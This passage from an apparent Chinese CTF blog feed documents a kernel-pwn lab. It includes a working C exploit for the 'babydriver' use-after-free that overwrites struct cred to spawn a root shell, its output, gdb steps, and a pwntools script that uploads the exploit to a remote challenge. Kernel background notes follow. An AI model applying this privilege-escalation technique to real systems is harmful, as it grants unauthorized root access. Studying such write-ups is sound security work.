title="调试"></a>调试</h2><p>漏洞点出在<code>uaf</code>，即释放之后没有清零，具体利用暂且不谈，本篇仅学习<code>kernel pwn</code>的一般过程，以下是<code>exp</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/wait.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> fd1<span class="token punctuation">,</span>fd2<span class="token punctuation">,</span>id<span class="token punctuation">;</span>    <span class="token keyword">char</span> cred<span class="token punctuation">[</span><span class="token number">0xa8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    fd1 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"dev/babydev"</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>    fd2 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"dev/babydev"</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd1<span class="token punctuation">,</span><span class="token number">0x10001</span><span class="token punctuation">,</span><span class="token number">0xa8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd1<span class="token punctuation">)</span><span class="token punctuation">;</span>    id <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>id <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">write</span><span class="token punctuation">(</span>fd2<span class="token punctuation">,</span>cred<span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*]welcome root:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>id <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*]fork fail\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token function">wait</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在解压的文件系统中写入<code>exp</code>的<code>c</code>程序并且<strong>静态编译</strong>（<code>kernel</code> 不提供标准库）再打包，再次启动就有了<code>exp</code>,执行之后就可以提权了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token operator">|</span> cpio <span class="token parameter variable">-o</span> <span class="token parameter variable">--format</span><span class="token operator">=</span>newc <span class="token operator">></span> <span class="token punctuation">..</span>/rootfs.cpio<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行结果</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> flagcat: can<span class="token string">'t open '</span>flag': Permission denied/ $ ./exp<span class="token punctuation">[</span>   <span class="token number">10.489723</span><span class="token punctuation">]</span> device <span class="token function">open</span><span class="token punctuation">[</span>   <span class="token number">10.492086</span><span class="token punctuation">]</span> device <span class="token function">open</span><span class="token punctuation">[</span>   <span class="token number">10.492300</span><span class="token punctuation">]</span> alloc <span class="token keyword">done</span><span class="token punctuation">[</span>   <span class="token number">10.493707</span><span class="token punctuation">]</span> device release<span class="token punctuation">[</span>*<span class="token punctuation">]</span>welcome root:/ <span class="token comment"># cat flag</span>flag<span class="token punctuation">&#123;</span>test<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>安装<code>vmlinux-to-elf</code>来得到有调试符号的<code>bzImage</code>（<code>python3&gt;3.5</code>）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pip3 <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> lz4 git+https://github.com/marin-m/vmlinux-to-elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vmlinux-to-elf bzImage vmlinux<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行结果</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">⚡  vmlinux-to-elf bzImage vmlinux<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Kernel successfully decompressed in-memory <span class="token punctuation">(</span>the offsets that follow will be given relative to the decompressed binary<span class="token punctuation">)</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Version string: Linux version <span class="token number">4.4</span>.72 <span class="token punctuation">(</span>atum@ubuntu<span class="token punctuation">)</span> <span class="token punctuation">(</span>gcc version <span class="token number">5.4</span>.0 <span class="token number">20160609</span> <span class="token punctuation">(</span>Ubuntu <span class="token number">5.4</span>.0-6ubuntu1~16.04.4<span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment">#1 SMP Thu Jun 15 19:52:50 PDT 2017</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Guessed architecture: x86_64 successfully <span class="token keyword">in</span> <span class="token number">2.60</span> seconds<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Found kallsyms_token_table at <span class="token function">file</span> offset 0x00eafe70<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Found kallsyms_token_index at <span class="token function">file</span> offset 0x00eb0210<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Found kallsyms_markers at <span class="token function">file</span> offset 0x00eaf318<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Found kallsyms_names at <span class="token function">file</span> offset 0x00d99480<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Found kallsyms_num_syms at <span class="token function">file</span> offset 0x00d99478<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Null addresses overall: <span class="token number">0.00215239</span> %<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Found kallsyms_addresses at <span class="token function">file</span> offset 0x00ce3cb8<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Successfully wrote the new ELF kernel to vmlinux⚡  <span class="token function">ls</span>boot.sh  bzImage  disk.flag.img  File_system  rootfs.cpio  vmlinux<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用<code>gdb</code>调试</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gdb <span class="token parameter variable">-q</span> <span class="token parameter variable">-ex</span> <span class="token string">"target remote localhost:1234"</span><span class="token builtin class-name">set</span> architecture i386:x86-64add-symbol-file vmlinux./boot.shc<span class="token comment"># 先 continue， 在 insmod 之后手动 Ctrl+C 再设置断点，免得断点处于 pending 状态</span>add-symbol-file babydriver.ko 0xffffffffc0000000<span class="token comment">#kernel shell中lsmod</span>b babyreadb babywriteb babyioctlb babyopenb babyreleasec./exp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="远程攻击"><a href="#远程攻击" class="headerlink" title="远程攻击"></a>远程攻击</h2><p>脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> string context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'ip'</span><span class="token punctuation">,</span> port<span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">send_cmd</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'$ '</span><span class="token punctuation">,</span> cmd<span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    lg <span class="token operator">=</span> log<span class="token punctuation">.</span>progress<span class="token punctuation">(</span><span class="token string">'Upload'</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'exp'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    encoded <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    encoded <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>encoded<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>encoded<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        lg<span class="token punctuation">.</span>status<span class="token punctuation">(</span><span class="token string">'%d / %d'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>encoded<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        send_cmd<span class="token punctuation">(</span><span class="token string">'echo -n "%s" >> benc'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>encoded<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">300</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    send_cmd<span class="token punctuation">(</span><span class="token string">'cat benc | base64 -d > bout'</span><span class="token punctuation">)</span>    send_cmd<span class="token punctuation">(</span><span class="token string">'chmod +x bout'</span><span class="token punctuation">)</span>    lg<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token punctuation">)</span> os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'musl-gcc -w -s -static -o3 exp.c -o exp'</span><span class="token punctuation">)</span>upload<span class="token punctuation">(</span><span class="token punctuation">)</span> r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="终端设备类型简介"><a href="#终端设备类型简介" class="headerlink" title="终端设备类型简介"></a>终端设备类型简介</h2><p>在 <code>Linux</code> 中 <code>/dev</code> 目录下，终端设备文件通常有以下几种(不同版本<code>linux</code>中不一定都存在)：</p><h3 id="x2F-dev-x2F-ttySn-串行端口终端"><a href="#x2F-dev-x2F-ttySn-串行端口终端" class="headerlink" title="&#x2F;dev&#x2F;ttySn-串行端口终端"></a>&#x2F;dev&#x2F;ttySn-串行端口终端</h3><p>用于与串行端口连接的终端设备，类似于 <code>Windows</code> 下的 <code>COM</code></p><h3 id="x2F-dev-x2F-tty-控制终端"><a href="#x2F-dev-x2F-tty-控制终端" class="headerlink" title="&#x2F;dev&#x2F;tty-控制终端"></a>&#x2F;dev&#x2F;tty-控制终端</h3><p><strong>当前进程</strong>的控制终端设备文件，类似于符号链接，会具体对应至某个实际终端文件</p><p>相关指令：</p><p><code>tty</code>：查看具体对应的终端设备</p><p><code>ps -ax</code>：查看进程与控制终端的映射关系</p><p><code>-append &#39;console=ttyS0</code>：<code>qemu</code>中设置 <code>linux kernel tty</code> 映射至 <code>/dev/ttySn</code> 上</p><h3 id="x2F-dev-x2F-ttyN-amp-x2F-dev-x2F-console-虚拟终端与控制台"><a href="#x2F-dev-x2F-ttyN-amp-x2F-dev-x2F-console-虚拟终端与控制台" class="headerlink" title="&#x2F;dev&#x2F;ttyN &amp; &#x2F;dev&#x2F;console-虚拟终端与控制台"></a>&#x2F;dev&#x2F;ttyN &amp; &#x2F;dev&#x2F;console-虚拟终端与控制台</h3><p>在<code>Linux</code> 系统中，计算机显示器通常被称为<strong>控制台终端</strong> (<code>Console</code>)，而在 <code>linux</code> <strong>初始字符界面</strong>下，为了同时处理多任务，自然需要多个终端的切换，这些终端由于是用软件来模拟以前硬件的方式，是虚拟出来的，因此也称为<strong>虚拟终端</strong></p><blockquote><p><strong>控制台是直接和计算机相连接的原生设备，终端是通过电缆、网络等等和主机连接的设备</strong></p></blockquote><p>我们日常所使用的图形界面下的终端，属于某个<strong>虚拟图形终端界面</strong>下的多个<strong>伪终端</strong>,可以通过 <code>Ctrl+Alt+Fx</code> （ <code>Fx</code> 表示切换至第 <strong><code>x</code></strong> 个终端，例如 <code>F1</code>）来切换虚拟终端，<code>tty0</code>是当前所使用虚拟终端的一个别名，系统所产生的信息会发送到该终端上，默认情况下，<code>F1-F6</code>均为字符终端界面，<code>F7-F12</code>为图形终端界面</p><h3 id="x2F-dev-x2F-pty-伪终端"><a href="#x2F-dev-x2F-pty-伪终端" class="headerlink" title="&#x2F;dev&#x2F;pty-伪终端"></a>&#x2F;dev&#x2F;pty-伪终端</h3><p><strong>伪终端(Pseudo Terminal)<strong>是成对的</strong>逻辑</strong>终端设备，其行为与普通终端非常相似，所不同的是伪终端没有对应的硬件设备，主要目的是实现双向信道，为其他程序提供终端形式的接口，当我们远程连接到主机时，与主机进行交互的终端的类型就是伪终端，而且日常使用的图形界面中的多个终端也全都是伪终端。</p><p>伪终端的两个终端设备分别称为 <code>master</code> 设备和 <code>slave</code> 设备，其中 <code>slave</code> 设备的行为与普通终端无异，当某个程序把某个 <code>master</code> 设备看作终端设备并进行读写，则该读写操作将实际反应至该逻辑终端设备所对应的另一个 <code>slave</code> 设备。通常 <code>slave</code> 设备也会被其他程序用于读写</p><h3 id="其他终端-（-x2F-dev-x2F-ttyprintk等）"><a href="#其他终端-（-x2F-dev-x2F-ttyprintk等）" class="headerlink" title="其他终端 （&#x2F;dev&#x2F;ttyprintk等）"></a>其他终端 （&#x2F;dev&#x2F;ttyprintk等）</h3><p>这类终端通常是用于特殊的目的，例如<code>/dev/ttyprintk</code>直接与内核缓冲区相连</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://kiprey.github.io/2021/10/kernel_pwn_introduction">https://kiprey.github.io/2021/10/kernel_pwn_introduction</a></p><p><a href="https://bbs.kanxue.com/thread-276403.htm#msg_header_h2_5">https://bbs.kanxue.com/thread-276403.htm#msg_header_h2_5</a></p>]]></content>
      
      
      <categories>
          
          <category> kernel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kernel基础知识</title>
      <link href="/2024/03/12/kernel-ji-chu-zhi-shi/kernel-ji-chu-zhi-shi/"/>
      <url>/2024/03/12/kernel-ji-chu-zhi-shi/kernel-ji-chu-zhi-shi/</url>
      
        <content type="html"><![CDATA[<h2 id="内核基础知识"><a href="#内核基础知识" class="headerlink" title="内核基础知识"></a>内核基础知识</h2><h3 id="kernel"><a href="#kernel" class="headerlink" title="kernel"></a>kernel</h3><p>用于管理软件发出的数据<code>I/O</code>要求的程序，将要求转义为指令交给<code>CPU</code>和其他组件处理，包括<code> I/O</code>，权限控制，系统调用，进程管理，内存管理等，<strong>kernel 的 crash 通常会引起重启</strong></p><ul><li>控制并与硬件进行交互</li><li>提供应用能运行的环境</li></ul><h3 id="Ring-Model"><a href="#Ring-Model" class="headerlink" title="Ring Model"></a>Ring Model</h3><p><code>cpu</code>分为<code>ring 0-3</code>四个特权级别，<code>ring0</code>仅<code>os</code>使用，<code>ring3</code>所以程序可用，大多操作系统仅<code>ring0</code>和<code>ring3</code></p><h3 id="Loadable-Kernel-Modules-LKMs"><a href="#Loadable-Kernel-Modules-LKMs" class="headerlink" title="Loadable Kernel Modules(LKMs)"></a>Loadable Kernel Modules(LKMs)</h3><p>可加载核心模块 (或直接称为内核模块) ,是内核空间的可执行程序，包括<strong>驱动程序（设备驱动、文件系统驱动）和内核扩展模块</strong>,和用户态的可执行程序相同，<code>Linux</code> 下为 <code>ELF</code>，<code>Windows</code> 下为 <code>exe/dll</code>，<code>mac</code> 下为 <code>MACH-O</code></p><p><strong>模块</strong>可以被单独编译，但不能单独运行，运行时<strong>被链接到内核</strong>作为内核的一部分在内核空间运行，这与运行在用户控件的进程不同</p><blockquote><p><code>Linux</code> 内核之所以提供模块机制，是因为它本身是一个单内核 (<code>monolithic kernel</code>)。单内核的优点是效率高，因为所有的内容都集合在一起，但缺点是可扩展性和可维护性相对较差，模块机制就是为了弥补这一缺陷。</p></blockquote><h4 id="相关指令"><a href="#相关指令" class="headerlink" title="相关指令"></a>相关指令</h4><ul><li><strong>insmod</strong>: 将指定<strong>模块加载到内核</strong>中</li><li><strong>rmmod</strong>: 从内核中<strong>卸载指定模块</strong></li><li><strong>lsmod</strong>: <strong>列出</strong>已经加载的模块</li><li><strong>modprobe</strong>: <strong>添加或删除</strong>模块，加载模块时会查找依赖关系</li></ul><blockquote><p>大多数　<code>CTF</code> 中的 <code>kernel vulnerability</code> 也出现在 <code>LKM</code> 中。</p></blockquote><h3 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h3><p>系统调用，指的是用户空间的程序向操作系统内核请求需要更高权限的服务，系统调用提供用户程序与操作系统间的接口，部分库函数实际上是对系统调用的封装</p><h3 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">NAME       ioctl <span class="token operator">-</span> control deviceSYNOPSIS       <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span>       <span class="token keyword">int</span> <span class="token function">ioctl</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> request<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>ioctl</code>也是一个系统调用，用于与设备通信</p><p><code>int ioctl(int fd, unsigned long request, ...)</code> 的第一个参数为打开设备 (<code>open</code>) 返回的文件描述符，第二个参数为用户程序对设备的<strong>控制命令</strong>，再后边的参数则是一些补充参数，与设备有关</p><blockquote><p>内核被设计成可扩展的，可以加入一个称为设备驱动的模块，驱动的代码允许在内核空间运行而且可以对设备直接寻址。对设备驱动的请求是一个以设备和请求号码为参数的 <code>ioctl</code> 调用，如此内核就允许用户空间访问设备驱动进而访问设备而不需要了解具体的设备细节，同时也不需要一大堆针对不同设备的系统调用</p></blockquote><h3 id="状态切换"><a href="#状态切换" class="headerlink" title="状态切换"></a>状态切换</h3><h4 id="user-space-to-kernel-space"><a href="#user-space-to-kernel-space" class="headerlink" title="user space to kernel space"></a>user space to kernel space</h4><p>当发生  <strong>系统调用</strong>， <strong>产生异常</strong> ， <strong>外设产生中断</strong> 等事件时，会发生用户态到内核态的切换，具体的过程为：</p><ol><li><p>通过 <code>swapgs</code> <strong>切换</strong> <code>gs</code> 段寄存器，将 <code>gs</code> 寄存器值和一个特定位置的值进行<strong>交换</strong>，目的是<strong>保存</strong> <code>gs</code> 值，同时将该位置的值作为内核执行时的 <code>gs</code> 值使用</p></li><li><p>将当前栈顶（<strong>用户空间栈顶</strong>）<strong>记录</strong>在 CPU 独占变量区域里，将 CPU 独占区域里记录的<strong>内核栈顶</strong>放入 <code>rsp/esp</code></p></li><li><p>通过 <code>push</code> 保存各寄存器值，具体的代码 如下:</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly"> ENTRY(entry_SYSCALL_64) &#x2F;* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 *&#x2F; SWAPGS_UNSAFE_STACK &#x2F;* 保存栈值，并设置内核栈 *&#x2F; movq %rsp, PER_CPU_VAR(rsp_scratch) movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp&#x2F;* 通过push保存寄存器值，形成一个pt_regs结构 *&#x2F;&#x2F;* Construct struct pt_regs on stack *&#x2F;pushq  $__USER_DS      &#x2F;* pt_regs-&gt;ss *&#x2F;pushq  PER_CPU_VAR(rsp_scratch)  &#x2F;* pt_regs-&gt;sp *&#x2F;pushq  %r11             &#x2F;* pt_regs-&gt;flags *&#x2F;pushq  $__USER_CS      &#x2F;* pt_regs-&gt;cs *&#x2F;pushq  %rcx             &#x2F;* pt_regs-&gt;ip *&#x2F;pushq  %rax             &#x2F;* pt_regs-&gt;orig_ax *&#x2F;pushq  %rdi             &#x2F;* pt_regs-&gt;di *&#x2F;pushq  %rsi             &#x2F;* pt_regs-&gt;si *&#x2F;pushq  %rdx             &#x2F;* pt_regs-&gt;dx *&#x2F;pushq  %rcx tuichu    &#x2F;* pt_regs-&gt;cx *&#x2F;pushq  $-ENOSYS        &#x2F;* pt_regs-&gt;ax *&#x2F;pushq  %r8              &#x2F;* pt_regs-&gt;r8 *&#x2F;pushq  %r9              &#x2F;* pt_regs-&gt;r9 *&#x2F;pushq  %r10             &#x2F;* pt_regs-&gt;r10 *&#x2F;pushq  %r11             &#x2F;* pt_regs-&gt;r11 *&#x2F;sub $(6*8), %rsp      &#x2F;* pt_regs-&gt;bp, bx, r12-15 not saved *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>通过汇编指令判断是否为 <code>x32_abi</code></p></li><li><p>通过系统调用号，跳到全局变量 <code>sys_call_table</code> 相应位置继续执行系统调用</p></li></ol><h4 id="kernel-space-to-user-space"><a href="#kernel-space-to-user-space" class="headerlink" title="kernel space to user space"></a>kernel space to user space</h4><p>退出时，流程如下：</p><ol><li>通过 <code>swapgs</code> 恢复 <code>gs</code> 值</li><li>通过 <code>sysretq</code> 或者 <code>iretq</code> 恢复到用户控件继续执行。如果使用 <code>iretq</code> 还需要给出用户空间的一些信息（<code>CS</code>, <code>eflags/rflags</code>, <code>esp/rsp</code> 等）</li></ol><h3 id="struct-cred"><a href="#struct-cred" class="headerlink" title="struct cred"></a>struct cred</h3><p><code>kernel</code> 用 <code>cred</code> 结构体记录了进程的权限等信息（<code>uid</code>，<code>gid</code> 等），每个进程中都有一个 <code>cred</code> 结构，如果能修改某个进程的 <code>cred</code>，那么也就修改了这个进程的权限</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">cred</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">atomic_t</span>    usage<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_DEBUG_CREDENTIALS</span></span>    <span class="token class-name">atomic_t</span>    subscribers<span class="token punctuation">;</span>    <span class="token comment">/* number of processes subscribed */</span>    <span class="token keyword">void</span>        <span class="token operator">*</span>put_addr<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span>    magic<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CRED_MAGIC</span>  <span class="token expression"><span class="token number">0x43736564</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CRED_MAGIC_DEAD</span> <span class="token expression"><span class="token number">0x44656144</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>    <span class="token class-name">kuid_t</span>      uid<span class="token punctuation">;</span>        <span class="token comment">/* real UID of the task */</span>    <span class="token class-name">kgid_t</span>      gid<span class="token punctuation">;</span>        <span class="token comment">/* real GID of the task */</span>    <span class="token class-name">kuid_t</span>      suid<span class="token punctuation">;</span>       <span class="token comment">/* saved UID of the task */</span>    <span class="token class-name">kgid_t</span>      sgid<span class="token punctuation">;</span>       <span class="token comment">/* saved GID of the task */</span>    <span class="token class-name">kuid_t</span>      euid<span class="token punctuation">;</span>       <span class="token comment">/* effective UID of the task */</span>    <span class="token class-name">kgid_t</span>      egid<span class="token punctuation">;</span>       <span class="token comment">/* effective GID of the task */</span>    <span class="token class-name">kuid_t</span>      fsuid<span class="token punctuation">;</span>      <span class="token comment">/* UID for VFS ops */</span>    <span class="token class-name">kgid_t</span>      fsgid<span class="token punctuation">;</span>      <span class="token comment">/* GID for VFS ops */</span>    <span class="token keyword">unsigned</span>    securebits<span class="token punctuation">;</span> <span class="token comment">/* SUID-less security management */</span>    <span class="token class-name">kernel_cap_t</span>    cap_inheritable<span class="token punctuation">;</span> <span class="token comment">/* caps our children can inherit */</span>    <span class="token class-name">kernel_cap_t</span>    cap_permitted<span class="token punctuation">;</span>  <span class="token comment">/* caps we're permitted */</span>    <span class="token class-name">kernel_cap_t</span>    cap_effective<span class="token punctuation">;</span>  <span class="token comment">/* caps we can actually use */</span>    <span class="token class-name">kernel_cap_t</span>    cap_bset<span class="token punctuation">;</span>   <span class="token comment">/* capability bounding set */</span>    <span class="token class-name">kernel_cap_t</span>    cap_ambient<span class="token punctuation">;</span>    <span class="token comment">/* Ambient capability set */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_KEYS</span></span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span>   jit_keyring<span class="token punctuation">;</span>    <span class="token comment">/* default keyring to attach requested                     * keys to */</span>    <span class="token keyword">struct</span> <span class="token class-name">key</span> __rcu <span class="token operator">*</span>session_keyring<span class="token punctuation">;</span> <span class="token comment">/* keyring inherited over fork */</span>    <span class="token keyword">struct</span> <span class="token class-name">key</span>  <span class="token operator">*</span>process_keyring<span class="token punctuation">;</span> <span class="token comment">/* keyring private to this process */</span>    <span class="token keyword">struct</span> <span class="token class-name">key</span>  <span class="token operator">*</span>thread_keyring<span class="token punctuation">;</span> <span class="token comment">/* keyring private to this thread */</span>    <span class="token keyword">struct</span> <span class="token class-name">key</span>  <span class="token operator">*</span>request_key_auth<span class="token punctuation">;</span> <span class="token comment">/* assumed request_key authority */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_SECURITY</span></span>    <span class="token keyword">void</span>        <span class="token operator">*</span>security<span class="token punctuation">;</span>  <span class="token comment">/* subjective LSM security */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>    <span class="token 